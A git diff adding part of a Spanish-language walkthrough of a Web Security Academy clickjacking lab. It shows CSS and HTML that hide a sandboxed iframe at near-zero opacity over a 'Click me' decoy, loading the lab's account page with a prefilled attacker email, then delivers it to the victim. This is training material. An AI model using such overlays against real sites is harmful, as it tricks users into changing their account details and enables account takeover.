@@ -130,3 +130,41 @@ El paso siguiente sería bajar un poco más el texto `Click me` para hacerlo coi
 <div>Click me</div>
 <iframe sandbox="allow-forms"
 src="https://0a4a006b0369302b806dd0ee00910067.web-security-academy.net/my-account?email=hacker@evil.com"></iframe>
+```
+
+![image](https://github.com/user-attachments/assets/98c13fd5-1e2a-47d7-a432-bbc0a84da673)
+
+El siguiente paso es bajarle la opacidad:
+```javascript
+<style>
+    iframe {
+        position: relative;
+        width: 500px;
+        height: 700px;
+        opacity: 0.000001;
+        z-index: 2;
+    }
+    div {
+        position: absolute;
+        top: 440px;
+        left: 70px;
+        z-index: 1;
+        background: #fff;
+        padding: 10px;
+        font-weight: bold;
+        cursor: pointer;
+    }
+</style>
+
+<div>Click me</div>
+<iframe sandbox="allow-forms"
+src="https://0a4a006b0369302b806dd0ee00910067.web-security-academy.net/my-account?email=hacker@evil.com"></iframe>
+```
+![image](https://github.com/user-attachments/assets/683016b4-3991-4c79-a90a-fc8f74279392)
+
+Con este valor de opacidad logramos que el iframe sea imperceptible, el siguiente paso es nuevamente hacer clic en `Store` y luego clic en `Deliver exploit to victim` para resolver el laboratorio:
+![image](https://github.com/user-attachments/assets/073bbae2-3e81-4aa8-b903-27162b8c6efa)
+
+
+
+
